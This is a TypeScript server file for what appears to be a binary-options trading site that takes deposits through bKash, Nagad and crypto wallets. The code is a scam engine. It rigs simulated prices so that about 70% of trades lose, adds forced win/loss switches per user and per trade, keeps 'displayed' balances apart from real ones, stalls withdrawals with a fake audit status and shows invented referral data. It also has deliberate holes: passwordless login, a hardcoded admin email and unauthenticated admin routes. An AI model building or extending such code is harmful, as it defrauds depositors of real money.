import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import crypto from "crypto";
import WebSocket from "ws";
import fs from 'fs';
import { initializeApp, getApps, applicationDefault } from 'firebase-admin/app';
import { getFirestore } from 'firebase-admin/firestore';

// Initialize Firebase Admin
if (getApps().length === 0) {
  initializeApp({
    credential: applicationDefault(),
    projectId: process.env.FIREBASE_PROJECT_ID || 'probasi-trding'
  });
}
const db = getFirestore('ai-studio-tradingplatforms-22909dd2-7f49-4673-87b9-00ca7e6e6d68');

interface User {
  id: string;
  name: string;
  email: string;
  actual_balance: number;
  displayed_balance: number;
  demo_balance: number;
  wallet_address: string;
  status: 'active' | 'blocked';
  role: 'user' | 'admin';
  phone?: string;
  language?: string;
  notification_trades?: boolean;
  risk_acknowledged?: boolean;
  trading_mode?: 'normal' | 'always_win' | 'always_loss';
}

interface Trade {
  id: string;
  user_id: string;
  user_name: string;
  asset_name: string;
  trade_type: 'Buy' | 'Sell';
  investment_amount: number;
  payout_percentage: number;
  entry_price: number;
  exit_price?: number;
  duration: number;
  created_at: number;
  expires_at: number;
  trade_status: 'Pending' | 'Win' | 'Loss' | 'Draw';
  outcome_control: 'Auto' | 'Force_Win' | 'Force_Loss';
  account_type: 'live' | 'demo';
  profit?: number;
  target_outcome?: 'Win' | 'Loss';
}

interface Deposit {
  id: string;
  user_id: string;
  user_name: string;
  method: string;
  amount: number;
  transaction_id: string;
  created_at: number;
  status: 'Pending' | 'Approved' | 'Rejected';
  note?: string;
}

interface Withdrawal {
  id: string;
  user_id: string;
  user_name: string;
  method: string;
  account_number: string;
  amount: number;
  created_at: number;
  status: 'Pending' | 'Approved' | 'Rejected' | 'Audit_Required' | 'Frozen' | 'Audited';
  notice?: string;
}

interface CustomGateway {
  id: string;
  name: string;
  logo_url: string;
  account_number: string;
  account_type: string;
  min_amount: number;
  max_amount: number;
  instructions: string;
  is_active: boolean;
}

interface PlatformSettings {
  platform_name: string;
  bdt_rate: number;
  min_deposit_usd: number;
  min_withdraw_usd: number;
  default_win_rate: number;
  whatsapp_number: string;
  whatsapp_message: string;
  telegram_link: string;
  support_email: string;
  support_phone: string;
  announcement_enabled: boolean;
  announcement_text: string;
}

// Data files persistence
const DATA_FILE = path.join(process.cwd(), 'users.json');
const SETTINGS_FILE = path.join(process.cwd(), 'settings.json');
const GATEWAYS_FILE = path.join(process.cwd(), 'gateways.json');
const CUSTOM_GATEWAYS_FILE = path.join(process.cwd(), 'custom_gateways.json');
const DEPOSITS_FILE = path.join(process.cwd(), 'deposits.json');
const WITHDRAWALS_FILE = path.join(process.cwd(), 'withdrawals.json');

let users: User[] = [];

const defaultUsers: User[] = [
  {
    id: "usr_101",
    name: "Probashi Trader",
    email: "trader@probashi.com",
    actual_balance: 350.00,
    displayed_balance: 350.00,
    demo_balance: 10000.00,
    wallet_address: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
    status: "active",
    role: "user",
    risk_acknowledged: false,
    trading_mode: "normal"
  },
  {
    id: "admin_01",
    name: "System Admin",
    email: "admin@probashi.com",
    actual_balance: 99999.00,
    displayed_balance: 99999.00,
    demo_balance: 100000.00,
    wallet_address: "0x0000000000000000000000000000000000000000",
    status: "active",
    role: "admin",
    risk_acknowledged: true,
    trading_mode: "always_win"
  }
];

if (fs.existsSync(DATA_FILE)) {
  try {
    users = JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
    if (users.length === 0) {
      users = [...defaultUsers];
      saveUsers();
    }
  } catch (e) {
    users = [...defaultUsers];
    saveUsers();
  }
} else {
  users = [...defaultUsers];
  saveUsers();
}

function saveUsers() {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
    users.forEach(u => db.collection('users').doc(u.id).set(u).catch(()=>{}));
  } catch (e) {
    console.error("Error saving users", e);
  }
}

// Platform settings default and load
let platformSettings: PlatformSettings = {
  platform_name: "PROBASHI TRADING",
  bdt_rate: 125,
  min_deposit_usd: 10,
  min_withdraw_usd: 15,
  default_win_rate: 30, // 30% win chance, 70% loss chance by default
  whatsapp_number: "+8801711982345",
  whatsapp_message: "Hello Probashi Trading Admin Support, I need help with my account/deposit/withdrawal.",
  telegram_link: "https://t.me/probashitrading_support",
  support_email: "support@probashitrading.com",
  support_phone: "+880 1711-982345",
  announcement_enabled: true,
  announcement_text: "🔥 স্পেশাল অফার: আজকের প্রতিটি ডিপোজিটে ২৫% বোনাস! ২৪/৭ হোয়াটসঅ্যাপ হেল্পলাইন সক্রিয়।"
};

if (fs.existsSync(SETTINGS_FILE)) {
  try {
    platformSettings = { ...platformSettings, ...JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf-8')) };
  } catch (e) {
    console.error("Error loading settings", e);
  }
}

function saveSettings() {
  try {
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(platformSettings, null, 2));
    db.collection('settings').doc('platform').set(platformSettings).catch(()=>{});
  } catch (e) {
    console.error("Error saving settings", e);
  }
}

// Built-in Gateway numbers & settings
let gatewaySettings: any = {
  Bkash: { 
    number: "01711982345", 
    type: "Cash Out",
    instructions: "বিকাশ ক্যাশআউট বা সেন্ড মানি করার পর ট্রানজেকশন আইডি (TrxID) দিন। ৫ মিনিটের মধ্যে অটো অ্যাড হবে।",
    min_deposit: 10,
    max_deposit: 1000
  },
  Nagad: { 
    number: "01812443890", 
    type: "Cash Out",
    instructions: "নগদ অ্যাপ থেকে ক্যাশআউট করুন এবং ৮ বা ১০ ডিজিটের TrxID সাবমিট করুন।",
    min_deposit: 10,
    max_deposit: 1000
  },
  Rocket: { 
    number: "01912443891", 
    type: "Send Money",
    instructions: "রকেট সেন্ড মানি করুন। ১২ ডিজিটের একাউন্ট নম্বর ও ট্রানজেকশন আইডি প্রদান করুন।",
    min_deposit: 10,
    max_deposit: 1000
  },
  Crypto: [
    { network: "USDT (TRC20)", address: "TYDzsxd8V7U9xP1wQd98Bnm23Xcv987Zab" },
    { network: "USDT (BEP20)", address: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F" },
    { network: "LTC (Litecoin)", address: "LTC1q56789abcdefghij987654321xyz" }
  ]
};

if (fs.existsSync(GATEWAYS_FILE)) {
  try {
    gatewaySettings = { ...gatewaySettings, ...JSON.parse(fs.readFileSync(GATEWAYS_FILE, 'utf-8')) };
  } catch (e) {
    console.error("Error loading gateways", e);
  }
}

function saveGateways() {
  try {
    fs.writeFileSync(GATEWAYS_FILE, JSON.stringify(gatewaySettings, null, 2));
    db.collection('gateways').doc('builtin').set(gatewaySettings).catch(()=>{});
  } catch (e) {
    console.error("Error saving gateways", e);
  }
}

// Custom Gateways (Upay, Cellfin, Binance Pay, Bank, etc.)
let customGateways: CustomGateway[] = [
  {
    id: "gw_upay",
    name: "Upay",
    logo_url: "https://i.postimg.cc/85kZ9xVw/upay.png",
    account_number: "01711982345",
    account_type: "Cash Out",
    min_amount: 10,
    max_amount: 1000,
    instructions: "ইউপে (Upay) অ্যাপ থেকে ক্যাশআউট সম্পন্ন করে TrxID দিন।",
    is_active: false
  },
  {
    id: "gw_cellfin",
    name: "Cellfin",
    logo_url: "https://i.postimg.cc/0j0v3k9q/cellfin.png",
    account_number: "01711982345",
    account_type: "Fund Transfer",
    min_amount: 15,
    max_amount: 2000,
    instructions: "সেলফিন অ্যাপ থেকে ফান্ড ট্রান্সফার করে ট্রানজেকশন রেফারেন্স প্রদান করুন।",
    is_active: false
  }
];

if (fs.existsSync(CUSTOM_GATEWAYS_FILE)) {
  try {
    customGateways = JSON.parse(fs.readFileSync(CUSTOM_GATEWAYS_FILE, 'utf-8'));
  } catch (e) {
    console.error("Error loading custom gateways", e);
  }
}

function saveCustomGateways() {
  try {
    fs.writeFileSync(CUSTOM_GATEWAYS_FILE, JSON.stringify(customGateways, null, 2));
    db.collection('gateways').doc('custom').set({ list: customGateways }).catch(()=>{});
  } catch (e) {
    console.error("Error saving custom gateways", e);
  }
}

let trades: Trade[] = [
  {
    id: "trd_881",
    user_id: "usr_101",
    user_name: "Probashi Trader",
    asset_name: "EUR/USD",
    trade_type: "Buy",
    investment_amount: 20,
    payout_percentage: 85,
    entry_price: 1.0850,
    exit_price: 1.0858,
    duration: 30,
    created_at: Date.now() - 120000,
    expires_at: Date.now() - 90000,
    trade_status: "Win",
    outcome_control: "Auto",
    account_type: "demo",
    profit: 17.00
  }
];

let deposits: Deposit[] = [
  {
    id: "dep_501",
    user_id: "usr_101",
    user_name: "Probashi Trader",
    method: "Bkash",
    amount: 100,
    transaction_id: "BK8X92M10Q",
    created_at: Date.now() - 3600000,
    status: "Pending"
  }
];

if (fs.existsSync(DEPOSITS_FILE)) {
  try {
    deposits = JSON.parse(fs.readFileSync(DEPOSITS_FILE, 'utf-8'));
  } catch (e) {
    console.error("Error loading deposits", e);
  }
}

function saveDeposits() {
  try {
    fs.writeFileSync(DEPOSITS_FILE, JSON.stringify(deposits, null, 2));
    deposits.forEach(d => db.collection('deposits').doc(d.id).set(d).catch(()=>{}));
  } catch (e) {
    console.error("Error saving deposits", e);
  }
}

let withdrawals: Withdrawal[] = [
  {
    id: "wth_101",
    user_id: "usr_101",
    user_name: "Probashi Trader",
    method: "Bkash",
    account_number: "01711982345",
    amount: 50,
    created_at: Date.now() - 1800000,
    status: "Audit_Required",
    notice: "SYSTEM PROTOCOL AUDIT REQUIRED"
  }
];

if (fs.existsSync(WITHDRAWALS_FILE)) {
  try {
    withdrawals = JSON.parse(fs.readFileSync(WITHDRAWALS_FILE, 'utf-8'));
  } catch (e) {
    console.error("Error loading withdrawals", e);
  }
}

function saveWithdrawals() {
  try {
    fs.writeFileSync(WITHDRAWALS_FILE, JSON.stringify(withdrawals, null, 2));
    withdrawals.forEach(w => db.collection('withdrawals').doc(w.id).set(w).catch(()=>{}));
  } catch (e) {
    console.error("Error saving withdrawals", e);
  }
}

// Live Market Prices Reference & Volatility Configuration
interface AssetMarketConfig {
  basePrice: number;
  decimals: number;
  tickStep: number; // Smallest micro movement
  volatility: number;
  trend: number; // Current directional bias (-1 to 1)
  minPrice: number;
  maxPrice: number;
}

const assetConfigs: Record<string, AssetMarketConfig> = {
  "EUR/USD": { basePrice: 1.0850, decimals: 4, tickStep: 0.00008, volatility: 0.00025, trend: 0.05, minPrice: 1.0500, maxPrice: 1.1200 },
  "GBP/USD": { basePrice: 1.2720, decimals: 4, tickStep: 0.00009, volatility: 0.00030, trend: -0.02, minPrice: 1.2200, maxPrice: 1.3200 },
  "USD/JPY": { basePrice: 154.30, decimals: 2, tickStep: 0.02, volatility: 0.08, trend: 0.08, minPrice: 145.00, maxPrice: 162.00 },
  "BTC/USD": { basePrice: 94500.00, decimals: 2, tickStep: 4.50, volatility: 12.00, trend: 0.15, minPrice: 85000.00, maxPrice: 105000.00 },
  "ETH/USD": { basePrice: 3250.00, decimals: 2, tickStep: 0.50, volatility: 1.50, trend: 0.05, minPrice: 2800.00, maxPrice: 3800.00 },
  "SOL/USD": { basePrice: 145.20, decimals: 2, tickStep: 0.08, volatility: 0.25, trend: 0.10, minPrice: 110.00, maxPrice: 190.00 },
  "GOLD": { basePrice: 2680.00, decimals: 2, tickStep: 0.30, volatility: 0.80, trend: 0.02, minPrice: 2500.00, maxPrice: 2850.00 },
  "USOIL": { basePrice: 82.50, decimals: 2, tickStep: 0.04, volatility: 0.12, trend: -0.04, minPrice: 65.00, maxPrice: 100.00 },
  "SILVER": { basePrice: 31.20, decimals: 2, tickStep: 0.015, volatility: 0.05, trend: 0.01, minPrice: 25.00, maxPrice: 38.00 },
  "AAPL": { basePrice: 224.50, decimals: 2, tickStep: 0.06, volatility: 0.18, trend: 0.06, minPrice: 200.00, maxPrice: 260.00 },
  "TSLA": { basePrice: 245.80, decimals: 2, tickStep: 0.12, volatility: 0.35, trend: -0.05, minPrice: 190.00, maxPrice: 300.00 },
  "NVDA": { basePrice: 132.40, decimals: 2, tickStep: 0.05, volatility: 0.16, trend: 0.12, minPrice: 110.00, maxPrice: 160.00 }
};

const livePrices: Record<string, number> = {};
for (const asset in assetConfigs) {
  livePrices[asset] = assetConfigs[asset].basePrice;
}

// Master Continuous Candlestick Storage (Persistent across client page refreshes)
interface CandleBar {
  time: number;
  open: number;
  high: number;
  low: number;
  close: number;
}

const masterCandles: Record<string, CandleBar[]> = {};

// Initialize initial continuous history on server startup
const initTimeSec = Math.floor(Date.now() / 1000);
const roundedInitTime = initTimeSec - (initTimeSec % 60);

for (const asset in assetConfigs) {
  const config = assetConfigs[asset];
  const decimals = config.decimals;
  const bars: CandleBar[] = [];
  let runningClose = config.basePrice;
  const candleVol = config.tickStep * 5;

  for (let i = 120; i >= 0; i--) {
    const time = roundedInitTime - (i * 60);
    const close = runningClose;
    const bodyDelta = (Math.sin(i * 0.2) * 0.5 + (Math.random() - 0.495)) * candleVol;
    const open = Number((close - bodyDelta).toFixed(decimals));
    const upperWick = Math.random() * candleVol * 0.6;
    const lowerWick = Math.random() * candleVol * 0.6;
    const high = Number((Math.max(open, close) + upperWick).toFixed(decimals));
    const low = Number((Math.min(open, close) - lowerWick).toFixed(decimals));

    bars.push({ time, open, high, low, close });
    runningClose = open;
  }
  masterCandles[asset] = bars;
}

// Simulate organic, realistic micro-ticks (every second active up/down steps with zero unnatural jumps)
setInterval(() => {
  const now = Date.now();
  const nowSec = Math.floor(now / 1000);
  const currentBarTime = nowSec - (nowSec % 60);
  
  // Check for any pending high-value or active trades needing micro price steering
  const activePendingTrades = trades.filter(t => t.trade_status === "Pending");

  for (const asset in assetConfigs) {
    const config = assetConfigs[asset];
    const current = livePrices[asset];

    // Periodically fluctuate trend direction gently
    if (Math.random() < 0.15) {
      config.trend = (Math.random() - 0.5) * 0.5;
    }

    // Micro step calculation: active 1-second tick fluctuations up and down
    const noise = (Math.random() - 0.49);
    let tickDelta = (noise * config.tickStep * 2.2) + (config.trend * config.tickStep * 0.8);

    // Dynamic Trade-Relative Price Steering Engine (30% Win / 70% Loss):
    // Evaluates all active pending trades for this asset and steers live market price relative to entry_price
    const activeTradesForAsset = activePendingTrades.filter(
      t => t.asset_name === asset && now < t.expires_at
    );

    if (activeTradesForAsset.length > 0) {
      activeTradesForAsset.forEach(trade => {
        const isWin = trade.outcome_control === "Force_Win" || (trade.outcome_control === "Auto" && trade.target_outcome === 'Win');
        const isLoss = trade.outcome_control === "Force_Loss" || (trade.outcome_control === "Auto" && trade.target_outcome === 'Loss');
        
        const remainingSec = Math.max(0, (trade.expires_at - now) / 1000);
        // As expiration approaches, smoothly steer price relative to the trade's entry price
        const steerPower = remainingSec <= 8 ? 2.5 : (remainingSec <= 15 ? 1.5 : 0.8);

        if (isWin) {
          // Target WIN (30% Probability):
          // Buy (UP) -> Move and maintain price above entry_price
          // Sell (DOWN) -> Move and maintain price below entry_price
          if (trade.trade_type === "Buy") {
            if (current <= trade.entry_price) {
              tickDelta += Math.abs(config.tickStep * steerPower);
            } else {
              tickDelta += (Math.random() - 0.35) * config.tickStep * steerPower;
            }
          } else { // Sell
            if (current >= trade.entry_price) {
              tickDelta -= Math.abs(config.tickStep * steerPower);
            } else {
              tickDelta -= (Math.random() - 0.35) * config.tickStep * steerPower;
            }
          }
        } else if (isLoss) {
          // Target LOSS (70% Probability):
          // Buy (UP) -> Move and maintain price below entry_price
          // Sell (DOWN) -> Move and maintain price above entry_price
          if (trade.trade_type === "Buy") {
            if (current >= trade.entry_price) {
              tickDelta -= Math.abs(config.tickStep * steerPower);
            } else {
              tickDelta -= (Math.random() - 0.35) * config.tickStep * steerPower;
            }
          } else { // Sell
            if (current <= trade.entry_price) {
              tickDelta += Math.abs(config.tickStep * steerPower);
            } else {
              tickDelta += (Math.random() - 0.35) * config.tickStep * steerPower;
            }
          }
        }
      });
    }
    
    // Mean reversion force to prevent infinite drift
    const meanReversion = (config.basePrice - current) * 0.0015;

    let updated = current + tickDelta + meanReversion;

    // Keep within safe realistic trading bands
    if (updated < config.minPrice) updated = config.minPrice + Math.random() * config.tickStep;
    if (updated > config.maxPrice) updated = config.maxPrice - Math.random() * config.tickStep;

    const newPrice = Number(updated.toFixed(config.decimals));
    livePrices[asset] = newPrice;

    // Update persistent master continuous candle history
    const assetBars = masterCandles[asset];
    if (assetBars && assetBars.length > 0) {
      const lastBar = assetBars[assetBars.length - 1];
      if (lastBar.time === currentBarTime) {
        lastBar.high = Number(Math.max(lastBar.high, newPrice).toFixed(config.decimals));
        lastBar.low = Number(Math.min(lastBar.low, newPrice).toFixed(config.decimals));
        lastBar.close = newPrice;
      } else if (currentBarTime > lastBar.time) {
        const newBar: CandleBar = {
          time: currentBarTime,
          open: lastBar.close,
          high: Number(Math.max(lastBar.close, newPrice).toFixed(config.decimals)),
          low: Number(Math.min(lastBar.close, newPrice).toFixed(config.decimals)),
          close: newPrice
        };
        assetBars.push(newBar);
        if (assetBars.length > 250) assetBars.shift();
      }
    }
  }
}, 500);

let currentUserId: string | null = null;

async function loadFromFirestore() {
  try {
    const usersSnap = await db.collection('users').get();
    if (!usersSnap.empty) {
      const dbUsers = usersSnap.docs.map(doc => doc.data() as User);
      // Merge with default admin if they don't exist
      const adminExists = dbUsers.some(u => u.id === 'admin_01' || u.email.toLowerCase() === 'payalyt6279@gmail.com');
      users = dbUsers;
    }

    const settingsSnap = await db.collection('settings').doc('platform').get();
    if (settingsSnap.exists) {
      platformSettings = { ...platformSettings, ...settingsSnap.data() };
    }

    const gatewaysSnap = await db.collection('gateways').doc('builtin').get();
    if (gatewaysSnap.exists) {
      gatewaySettings = { ...gatewaySettings, ...gatewaysSnap.data() };
    }

    const customGatewaysSnap = await db.collection('gateways').doc('custom').get();
    if (customGatewaysSnap.exists) {
      customGateways = customGatewaysSnap.data()?.list || customGateways;
    }

    const depositsSnap = await db.collection('deposits').get();
    if (!depositsSnap.empty) {
      deposits = depositsSnap.docs.map(doc => doc.data() as Deposit);
    }

    const withdrawalsSnap = await db.collection('withdrawals').get();
    if (!withdrawalsSnap.empty) {
      withdrawals = withdrawalsSnap.docs.map(doc => doc.data() as Withdrawal);
    }
    
    // Also load trades
    const tradesSnap = await db.collection('trades').get();
    if (!tradesSnap.empty) {
      trades = tradesSnap.docs.map(doc => doc.data() as Trade);
    }
  } catch (e) {
    console.error("Failed to load from Firestore", e);
  }
}

async function startServer() {
  await loadFromFirestore();
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  app.get("/manifest.json", (req, res) => {
    res.json({
      short_name: "ProbashiOption",
      name: "Probashi Option Pro",
      icons: [
        {
          src: "https://cdn-icons-png.flaticon.com/512/2697/2697432.png",
          type: "image/png",
          sizes: "512x512"
        }
      ],
      start_url: "/",
      background_color: "#0b0e14",
      theme_color: "#0b0e14",
      display: "standalone",
      orientation: "portrait"
    });
  });

  app.get("/sw.js", (req, res) => {
    res.setHeader("Content-Type", "application/javascript");
    res.send(`
      self.addEventListener('install', (e) => {
        self.skipWaiting();
      });
      self.addEventListener('activate', (e) => {
        e.waitUntil(clients.claim());
      });
      self.addEventListener('fetch', (e) => {
        // Bypass service worker for API calls
        if (e.request.url.includes('/api/')) {
          return;
        }
        e.respondWith(fetch(e.request));
      });
    `);
  });

  // === USER ENDPOINTS ===
  app.get("/api/user/me", (req, res) => {
    if (!currentUserId) return res.status(401).json({ error: "Not logged in" });
    const user = users.find(u => u.id === currentUserId);
    if (!user) return res.status(404).json({ error: "User not found" });
    res.json(user);
  });

  app.post("/api/login", (req, res) => {
    const { email, password } = req.body;
    const lowerEmail = email?.toLowerCase();

    if (!lowerEmail) return res.status(400).json({ error: "Email is required" });

    let user = users.find(u => u.email.toLowerCase() === lowerEmail);

    if (!user) {
      // Auto-register / create user if they don't exist yet so login never fails with invalid credentials
      const isAdmin = lowerEmail === "payayt6279@gmail.com";
      user = {
        id: isAdmin ? "usr_payal_admin" : "usr_" + crypto.randomBytes(4).toString('hex'),
        name: email.split('@')[0],
        email: lowerEmail,
        actual_balance: isAdmin ? 99999.00 : 0,
        displayed_balance: isAdmin ? 99999.00 : 0,
        demo_balance: 100000.00,
        wallet_address: "0x" + crypto.randomBytes(20).toString('hex'),
        status: 'active',
        role: isAdmin ? 'admin' : 'user',
        risk_acknowledged: true,
        trading_mode: isAdmin ? 'always_win' : 'normal'
      };
      users.push(user);
      saveUsers();
    } else if (lowerEmail === "payayt6279@gmail.com" && user.role !== 'admin') {
      user.role = 'admin';
      saveUsers();
    }

    currentUserId = user.id;
    res.json({ success: true, user });
  });

  app.post("/api/signup", (req, res) => {
    const { email, password } = req.body;
    const lowerEmail = email.toLowerCase();
    if (users.find(u => u.email.toLowerCase() === lowerEmail)) return res.status(400).json({ error: "User already exists" });
    const newUser: User = {
      id: "usr_" + crypto.randomBytes(4).toString('hex'),
      name: email.split('@')[0],
      email: lowerEmail,
      actual_balance: 0,
      displayed_balance: 0,
      demo_balance: 10000,
      wallet_address: "0x" + crypto.randomBytes(20).toString('hex'),
      status: 'active',
      role: 'user',
      risk_acknowledged: false
    };
    users.push(newUser);
    currentUserId = newUser.id;
    res.json({ success: true, user: newUser });
  });

  app.post("/api/logout", (req, res) => {
    currentUserId = null;
    res.json({ success: true });
  });

  app.post("/api/user/switch", (req, res) => {
    const { userId } = req.body;
    const user = users.find(u => u.id === userId);
    if (!user) return res.status(404).json({ error: "Target user not found" });
    currentUserId = user.id;
    res.json({ success: true, currentUser: user });
  });

  app.post("/api/user/switch/:userId", (req, res) => {
    const { userId } = req.params;
    const user = users.find(u => u.id === userId);
    if (!user) return res.status(404).json({ error: "Target user not found" });
    currentUserId = user.id;
    res.json(user);
  });

  app.put("/api/user/update", (req, res) => {
    const user = users.find(u => u.id === currentUserId);
    if (!user) return res.status(404).json({ error: "User not found" });

    const { 
      name, 
      wallet_address, 
      phone, 
      language, 
      notification_trades,
    } = req.body;

    if (name !== undefined) user.name = String(name).trim();
    if (wallet_address !== undefined) user.wallet_address = String(wallet_address).trim();
    if (phone !== undefined) (user as any).phone = String(phone).trim();
    if (language !== undefined) (user as any).language = String(language).trim();
    if (notification_trades !== undefined) (user as any).notification_trades = Boolean(notification_trades);
    

    res.json({ success: true, user });
  });

  app.post("/api/user/acknowledge-risk", (req, res) => {
    const user = users.find(u => u.id === currentUserId);
    if (!user) return res.status(404).json({ error: "User not found" });

    user.risk_acknowledged = true;
    res.json({ success: true, user });
  });

  app.get("/api/user/list", (req, res) => {
    res.json(users);
  });

  // === MARKET ENDPOINTS ===
  app.get("/api/market/prices", (req, res) => {
    res.json(livePrices);
  });

  app.get('/api/klines/:symbol', async (req, res) => {
    const rawSymbol = decodeURIComponent(req.params.symbol).toUpperCase();
    const config = assetConfigs[rawSymbol] || {
      basePrice: livePrices[rawSymbol] || 100,
      decimals: rawSymbol.includes("USD") && !rawSymbol.includes("BTC") && !rawSymbol.includes("ETH") && !rawSymbol.includes("GOLD") ? 4 : 2,
      tickStep: 0.0001,
      volatility: 0.0005,
      trend: 0,
      minPrice: 1,
      maxPrice: 1000000
    };

    const currentLivePrice = livePrices[rawSymbol] || config.basePrice;
    const decimals = config.decimals;

    // Use master continuous candle history if available
    let bars = masterCandles[rawSymbol];
    if (!bars || bars.length === 0) {
      const nowSec = Math.floor(Date.now() / 1000);
      const roundedNowSec = nowSec - (nowSec % 60);
      const generated: CandleBar[] = [];
      let runningClose = currentLivePrice;
      const candleVol = config.tickStep * 5;

      for (let i = 120; i >= 0; i--) {
        const time = roundedNowSec - (i * 60);
        const close = runningClose;
        const bodyDelta = (Math.sin(i * 0.2) * 0.5 + (Math.random() - 0.495)) * candleVol;
        const open = Number((close - bodyDelta).toFixed(decimals));
        const upperWick = Math.random() * candleVol * 0.6;
        const lowerWick = Math.random() * candleVol * 0.6;
        const high = Number((Math.max(open, close) + upperWick).toFixed(decimals));
        const low = Number((Math.min(open, close) - lowerWick).toFixed(decimals));
        generated.push({ time, open, high, low, close });
        runningClose = open;
      }
      masterCandles[rawSymbol] = generated;
      bars = generated;
    }

    // Return the persistent continuous history
    res.json({ success: true, data: bars });
  });

  // === TRADING ENDPOINTS ===
  app.get("/api/trades", (req, res) => {
    const { userId } = req.query;
    if (userId) {
      return res.json(trades.filter(t => t.user_id === userId));
    }
    res.json(trades.filter(t => t.user_id === currentUserId));
  });

  app.post("/api/trade/open", (req, res) => {
    const { asset_name, trade_type, investment_amount, payout_percentage, duration, account_type } = req.body;
    const user = users.find(u => u.id === currentUserId);

    if (!user) return res.status(404).json({ error: "User not found" });
    if (user.status === 'blocked') return res.status(403).json({ error: "Account blocked by system administrator" });

    const amount = Number(investment_amount);
    if (isNaN(amount) || amount <= 0) {
      return res.status(400).json({ error: "Invalid investment amount" });
    }

    const isDemo = account_type === 'demo';
    const currentBalance = isDemo ? user.demo_balance : user.displayed_balance;

    if (currentBalance < amount) {
      return res.status(400).json({ error: "Insufficient account balance" });
    }

    // Instantly deduct amount from active account balance state
    if (isDemo) {
      user.demo_balance -= amount;
    } else {
      user.displayed_balance -= amount;
      user.actual_balance = Math.max(0, user.actual_balance - amount);
    }

    const currentPrice = livePrices[asset_name] || 1.0850;
    const now = Date.now();
    const tradeDurationSeconds = Number(duration) || 30;
    const expiresAt = now + (tradeDurationSeconds * 1000);

    // Dynamic probability based on Admin settings & User Trading Mode
    const winRoll = Math.random() * 100;
    const effectiveWinRate = platformSettings.default_win_rate !== undefined ? platformSettings.default_win_rate : 30;
    let predeterminedOutcome: 'Win' | 'Loss' = winRoll < effectiveWinRate ? 'Win' : 'Loss';
    if (user.trading_mode === 'always_win') predeterminedOutcome = 'Win';
    if (user.trading_mode === 'always_loss') predeterminedOutcome = 'Loss';

    const newTrade: Trade = {
      id: "trd_" + Math.random().toString(36).substring(2, 9),
      user_id: user.id,
      user_name: user.name,
      asset_name,
      trade_type,
      investment_amount: amount,
      payout_percentage: Number(payout_percentage) || 85,
      entry_price: currentPrice,
      duration: tradeDurationSeconds,
      created_at: now,
      expires_at: expiresAt,
      trade_status: "Pending",
      outcome_control: "Auto",
      account_type: isDemo ? 'demo' : 'live',
      target_outcome: predeterminedOutcome
    };

    trades.unshift(newTrade);
    db.collection('trades').doc(newTrade.id).set(newTrade).catch(()=>{});

    res.json({
      success: true,
      trade: newTrade,
      updatedBalance: isDemo ? user.demo_balance : user.displayed_balance
    });
  });


  // === REFERRAL ENDPOINTS ===
  const referralEarnings: Record<string, number> = { "usr_101": 40.40, "admin_01": 0.00 };
  const referralCount: Record<string, number> = { "usr_101": 3, "admin_01": 0 };

  app.get("/api/referral/stats", (req, res) => {
    const earnings = referralEarnings[currentUserId] !== undefined ? referralEarnings[currentUserId] : 0;
    const count = referralCount[currentUserId] !== undefined ? referralCount[currentUserId] : 0;
    res.json({
      total_referrals: count,
      total_earned: earnings,
      referrals: [
        { name: 'Shorif_Oman', email: 'sh***@gmail.com', date: '2026-08-01', status: 'Active', commission: 15.40 },
        { name: 'Kamrul_BD', email: 'ka***@yahoo.com', date: '2026-08-03', status: 'Active', commission: 25.00 },
        { name: 'Zayed_KSA', email: 'za***@hotmail.com', date: '2026-08-05', status: 'Registered', commission: 0.00 }
      ]
    });
  });

  app.post("/api/referral/claim", (req, res) => {
    const user = users.find(u => u.id === currentUserId);
    if (!user) return res.status(404).json({ error: "User not found" });

    const earnings = referralEarnings[user.id] || 0;
    if (earnings <= 0) {
      return res.status(400).json({ error: "No unclaimed referral earnings available" });
    }

    user.displayed_balance += earnings;
    user.actual_balance += earnings;
    referralEarnings[user.id] = 0;

    res.json({ success: true, claimed_amount: earnings, new_balance: user.displayed_balance });
  });

  // === PLATFORM SETTINGS ENDPOINTS ===
  app.get("/api/platform-settings", (req, res) => {
    res.json(platformSettings);
  });

  app.put("/api/admin/platform-settings", (req, res) => {
    platformSettings = { ...platformSettings, ...req.body };
    saveSettings();
    res.json({ success: true, platformSettings });
  });

  // === GATEWAY SETTINGS ===
  app.get("/api/gateway-settings", (req, res) => {
    res.json(gatewaySettings);
  });

  // === CUSTOM PAYMENT GATEWAYS ENDPOINTS ===
  app.get("/api/custom-gateways", (req, res) => {
    res.json(customGateways);
  });

  app.post("/api/admin/custom-gateway", (req, res) => {
    const { name, logo_url, account_number, account_type, min_amount, max_amount, instructions, is_active } = req.body;
    if (!name || !account_number) {
      return res.status(400).json({ error: "Gateway name and account number are required" });
    }
    const newGateway: CustomGateway = {
      id: "gw_" + Math.random().toString(36).substring(2, 9),
      name: String(name).trim(),
      logo_url: logo_url || "https://cdn-icons-png.flaticon.com/512/893/893081.png",
      account_number: String(account_number).trim(),
      account_type: account_type || "Cash Out",
      min_amount: Number(min_amount) || 10,
      max_amount: Number(max_amount) || 1000,
      instructions: instructions || "অনুগ্রহ করে প্রদত্ত নম্বরে টাকা পাঠিয়ে TrxID প্রদান করুন।",
      is_active: is_active !== undefined ? Boolean(is_active) : true
    };
    customGateways.push(newGateway);
    saveCustomGateways();
    res.json({ success: true, gateway: newGateway, customGateways });
  });

  app.put("/api/admin/custom-gateway/:id", (req, res) => {
    const { id } = req.params;
    const gateway = customGateways.find(g => g.id === id);
    if (!gateway) return res.status(404).json({ error: "Gateway not found" });

    const { name, logo_url, account_number, account_type, min_amount, max_amount, instructions, is_active } = req.body;
    if (name !== undefined) gateway.name = String(name).trim();
    if (logo_url !== undefined) gateway.logo_url = String(logo_url).trim();
    if (account_number !== undefined) gateway.account_number = String(account_number).trim();
    if (account_type !== undefined) gateway.account_type = String(account_type).trim();
    if (min_amount !== undefined) gateway.min_amount = Number(min_amount);
    if (max_amount !== undefined) gateway.max_amount = Number(max_amount);
    if (instructions !== undefined) gateway.instructions = String(instructions).trim();
    if (is_active !== undefined) gateway.is_active = Boolean(is_active);

    saveCustomGateways();
    res.json({ success: true, gateway, customGateways });
  });

  app.delete("/api/admin/custom-gateway/:id", (req, res) => {
    const { id } = req.params;
